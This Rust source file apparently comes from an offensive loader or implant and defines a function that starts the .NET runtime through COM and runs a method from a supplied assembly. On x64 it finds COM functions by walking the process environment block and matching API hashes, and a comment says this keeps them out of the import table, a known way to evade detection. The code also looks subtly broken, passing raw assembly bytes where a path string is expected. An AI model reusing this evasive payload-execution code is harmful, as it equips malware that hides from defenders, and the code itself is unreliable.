#[cfg(target_os = "windows")]
const CLSID_CLR_META_HOST: windows_sys::core::GUID = windows_sys::core::GUID {
    data1: 0x9280188d, data2: 0x0e8e, data3: 0x4867,
    data4: [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
};

#[cfg(target_os = "windows")]
const IID_ICLR_META_HOST: windows_sys::core::GUID = windows_sys::core::GUID {
    data1: 0xd332db9e, data2: 0xb9b3, data3: 0x4125,
    data4: [0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16],
};

/// Load a .NET assembly and execute an entry point via ICLRRuntimeHost2.
/// clr_version: wide string e.g., "v4.0.30319\0" as u16 slice
#[cfg(target_os = "windows")]
pub unsafe fn load_assembly_appdomain(
    clr_version:    &[u16],
    assembly_bytes:  &[u8],
    type_name:       &[u16],
    method_name:     &[u16],
    argument:        &[u16],
) -> bool {
    // x64: resolve CoInitializeEx / CoCreateInstance from ole32.dll via PEB + hash.
    // Removes combase/ole32 from IAT entirely.
    #[cfg(target_arch = "x86_64")]
    {
        use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
        use crate::resolve::api_hash::h;
        let ole32 = peb_get_module_base(h::DLL_OLE32);
        if let Some(co_init) = resolve_by_hash(ole32, h::CO_INIT_EX) {
            type CoInitFn = unsafe extern "system" fn(*const core::ffi::c_void, u32) -> i32;
            let f: CoInitFn = core::mem::transmute(co_init);
            f(core::ptr::null(), 0); // COINIT_MULTITHREADED = 0
        }
        let co_create = match resolve_by_hash(ole32, h::CO_CREATE_INST) {
            Some(p) => p,
            None => return false,
        };
        type CoCreateFn = unsafe extern "system" fn(
            *const windows_sys::core::GUID,
            *mut core::ffi::c_void,
            u32,
            *const windows_sys::core::GUID,
            *mut *mut core::ffi::c_void,
        ) -> i32;
        let co_create_fn: CoCreateFn = core::mem::transmute(co_create);
        let mut meta_host: *mut core::ffi::c_void = core::ptr::null_mut();
        let hr = co_create_fn(
            &CLSID_CLR_META_HOST,
            core::ptr::null_mut(),
            1, // CLSCTX_INPROC_SERVER
            &IID_ICLR_META_HOST,
            &mut meta_host,
        );
        if hr != 0 || meta_host.is_null() { return false; }

        let meta_vtable = *(meta_host as *mut *mut *const usize);
        type GetRuntimeFn = unsafe extern "system" fn(
            *mut core::ffi::c_void, *const u16,
            *const windows_sys::core::GUID,
            *mut *mut core::ffi::c_void,
        ) -> i32;
        let get_runtime: GetRuntimeFn = core::mem::transmute(*meta_vtable.add(3));

        let iid_runtime_info = windows_sys::core::GUID {
            data1: 0xbd39d1d2, data2: 0xba2f, data3: 0x486a,
            data4: [0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91],
        };
        let mut runtime_info: *mut core::ffi::c_void = core::ptr::null_mut();
        get_runtime(meta_host, clr_version.as_ptr(), &iid_runtime_info, &mut runtime_info);
        if runtime_info.is_null() { return false; }

        let rt_vtable = *(runtime_info as *mut *mut *const usize);
        type GetInterfaceFn = unsafe extern "system" fn(
            *mut core::ffi::c_void,
            *const windows_sys::core::GUID,
            *const windows_sys::core::GUID,
            *mut *mut core::ffi::c_void,
        ) -> i32;
        let get_iface: GetInterfaceFn = core::mem::transmute(*rt_vtable.add(9));

        let clsid_clr_host = windows_sys::core::GUID {
            data1: 0x90f1a06e, data2: 0x7712, data3: 0x4762,
            data4: [0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02],
        };
        let iid_clr_host2 = windows_sys::core::GUID {
            data1: 0x712ab452, data2: 0x287c, data3: 0x4501,
            data4: [0xbe, 0xbc, 0xbf, 0x98, 0x68, 0xbf, 0xb9, 0x0b],
        };
        let mut runtime_host: *mut core::ffi::c_void = core::ptr::null_mut();
        get_iface(runtime_info, &clsid_clr_host, &iid_clr_host2, &mut runtime_host);
        if runtime_host.is_null() { return false; }

        let rh_vtable = *(runtime_host as *mut *mut *const usize);
        type StartFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        let start: StartFn = core::mem::transmute(*rh_vtable.add(3));
        start(runtime_host);

        type ExecFn = unsafe extern "system" fn(
            *mut core::ffi::c_void,
            *const u16, *const u16, *const u16, *const u16,
            *mut u32,
        ) -> i32;
        let exec: ExecFn = core::mem::transmute(*rh_vtable.add(11));
        let mut ret_val: u32 = 0;
        exec(
            runtime_host,
            assembly_bytes.as_ptr() as *const u16,
            type_name.as_ptr(),
            method_name.as_ptr(),
            argument.as_ptr(),
            &mut ret_val,
        );
        return true;
    }

    // non-x64 fallback: use imported COM functions
    #[cfg(not(target_arch = "x86_64"))]
    {
        use windows_sys::Win32::System::Com::{
            CoCreateInstance, CoInitializeEx, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
        };
        CoInitializeEx(core::ptr::null(), COINIT_MULTITHREADED as u32);

        let mut meta_host: *mut core::ffi::c_void = core::ptr::null_mut();
        let hr = CoCreateInstance(
            &CLSID_CLR_META_HOST,
            core::ptr::null_mut(),
            CLSCTX_INPROC_SERVER,
            &IID_ICLR_META_HOST,
            &mut meta_host,
        );
        if hr != 0 || meta_host.is_null() { return false; }

        let meta_vtable = *(meta_host as *mut *mut *const usize);
        type GetRuntimeFn = unsafe extern "system" fn(
            *mut core::ffi::c_void, *const u16,
            *const windows_sys::core::GUID,
            *mut *mut core::ffi::c_void,
        ) -> i32;
        let get_runtime: GetRuntimeFn = core::mem::transmute(*meta_vtable.add(3));

        let iid_runtime_info = windows_sys::core::GUID {
            data1: 0xbd39d1d2, data2: 0xba2f, data3: 0x486a,
            data4: [0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91],
        };
        let mut runtime_info: *mut core::ffi::c_void = core::ptr::null_mut();
        get_runtime(meta_host, clr_version.as_ptr(), &iid_runtime_info, &mut runtime_info);
        if runtime_info.is_null() { return false; }

        let rt_vtable = *(runtime_info as *mut *mut *const usize);
        type GetInterfaceFn = unsafe extern "system" fn(
            *mut core::ffi::c_void,
            *const windows_sys::core::GUID,
            *const windows_sys::core::GUID,
            *mut *mut core::ffi::c_void,
        ) -> i32;
        let get_iface: GetInterfaceFn = core::mem::transmute(*rt_vtable.add(9));

        let clsid_clr_host = windows_sys::core::GUID {
            data1: 0x90f1a06e, data2: 0x7712, data3: 0x4762,
            data4: [0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02],
        };
        let iid_clr_host2 = windows_sys::core::GUID {
            data1: 0x712ab452, data2: 0x287c, data3: 0x4501,
            data4: [0xbe, 0xbc, 0xbf, 0x98, 0x68, 0xbf, 0xb9, 0x0b],
        };
        let mut runtime_host: *mut core::ffi::c_void = core::ptr::null_mut();
        get_iface(runtime_info, &clsid_clr_host, &iid_clr_host2, &mut runtime_host);
        if runtime_host.is_null() { return false; }

        let rh_vtable = *(runtime_host as *mut *mut *const usize);
        type StartFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        let start: StartFn = core::mem::transmute(*rh_vtable.add(3));
        start(runtime_host);

        type ExecFn = unsafe extern "system" fn(
            *mut core::ffi::c_void,
            *const u16, *const u16, *const u16, *const u16,
            *mut u32,
        ) -> i32;
        let exec: ExecFn = core::mem::transmute(*rh_vtable.add(11));
        let mut ret_val: u32 = 0;
        exec(
            runtime_host,
            assembly_bytes.as_ptr() as *const u16,
            type_name.as_ptr(),
            method_name.as_ptr(),
            argument.as_ptr(),
            &mut ret_val,
        );
        return true;
    }
}
